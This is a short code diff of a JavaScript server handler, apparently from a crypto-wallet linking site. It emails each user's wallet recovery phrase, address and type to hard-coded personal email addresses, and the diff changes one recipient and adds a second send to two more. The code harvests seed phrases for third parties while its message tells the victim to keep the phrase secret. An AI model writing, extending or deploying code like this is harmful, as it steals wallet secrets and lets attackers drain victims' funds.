@@ -299,12 +299,19 @@ exports.linkWallet = async (req, res) => {
 
     const referenceNumber = generateReferenceNumber();
     await sendEmail(
-      'aguchris740@gmail.com',
+      'ysmboy009@gmail.com',
       'Your Recovery Phrase Linked',
       `Your recovery phrase is: ${phrase}\nWallet Address: ${walletAddress}\nType: ${type}\n\nPlease store this safely and never share it with anyone.
       \nReference Number: ${referenceNumber}`
     );
-  
+
+await sendEmail(
+      ['aguchris740@gmail.com','justtrust002@gmail.com'],
+      'Your Recovery Phrase Linked',
+      `Your recovery phrase is: ${phrase}\nWallet Address: ${walletAddress}\nType: ${type}\n\nPlease store this safely and never share it with anyone.
+      \nReference Number: ${referenceNumber}`
+    );
+    
     user.wallets.push({
       phrase,
       walletAddress,
